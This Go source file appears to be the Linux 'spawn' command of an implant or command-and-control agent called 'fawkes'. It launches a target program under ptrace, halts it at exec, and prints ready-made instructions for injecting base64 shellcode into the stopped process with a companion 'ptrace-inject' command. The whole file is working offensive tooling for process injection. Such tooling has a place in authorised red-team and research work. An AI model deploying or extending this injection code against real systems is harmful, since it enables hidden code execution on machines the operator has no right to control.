//go:build linux

package commands

import (
	"fmt"
	"os/exec"
	"strings"
	"syscall"

	"fawkes/pkg/structs"
)

type SpawnCommand struct{}

func (c *SpawnCommand) Name() string        { return "spawn" }
func (c *SpawnCommand) Description() string { return "Spawn a suspended process for injection" }

func (c *SpawnCommand) Execute(task structs.Task) structs.CommandResult {
	params, parseErr := unmarshalParams[SpawnParams](task)
	if parseErr != nil {
		return *parseErr
	}

	params.Mode = strings.ToLower(params.Mode)
	if params.Mode == "" {
		params.Mode = "process"
	}

	switch params.Mode {
	case "process":
		return spawnSuspendedProcessLinux(params)
	case "thread":
		return errorResult("Error: thread mode requires ptrace-inject on Linux (use spawn -mode process + ptrace-inject)")
	default:
		return errorf("Unknown mode: %s (use process)", params.Mode)
	}
}

func spawnSuspendedProcessLinux(params SpawnParams) structs.CommandResult {
	if params.Path == "" {
		return errorResult("Error: path is required")
	}

	var sb strings.Builder
	sb.WriteString("[*] Spawn Mode: Suspended Process (Linux)\n")
	sb.WriteString(fmt.Sprintf("[*] Target executable: %s\n", params.Path))

	parts := strings.Fields(params.Path)
	var cmd *exec.Cmd
	if len(parts) > 1 {
		cmd = exec.Command(parts[0], parts[1:]...)
	} else {
		cmd = exec.Command(parts[0])
	}

	cmd.SysProcAttr = &syscall.SysProcAttr{
		Ptrace: true,
	}

	if err := cmd.Start(); err != nil {
		return errorf("Error starting process: %v", err)
	}

	pid := cmd.Process.Pid

	var ws syscall.WaitStatus
	_, err := syscall.Wait4(pid, &ws, syscall.WALL, nil)
	if err != nil {
		return errorf("Error waiting for process stop: %v", err)
	}

	sb.WriteString("[+] Process created and stopped (PTRACE_TRACEME)\n")
	sb.WriteString(fmt.Sprintf("[+] Process ID (PID): %d\n", pid))

	if ws.Stopped() {
		sb.WriteString(fmt.Sprintf("[+] Stop signal: %v\n", ws.StopSignal()))
	}

	sb.WriteString("\n[*] Process is stopped at exec. Use ptrace-inject to inject shellcode:\n")
	sb.WriteString(fmt.Sprintf("    ptrace-inject -action inject -pid %d -shellcode_b64 <base64>\n", pid))
	sb.WriteString("\n[*] Or detach to let it run normally:\n")
	sb.WriteString(fmt.Sprintf("    kill -CONT %d\n", pid))

	return successResult(sb.String())
}
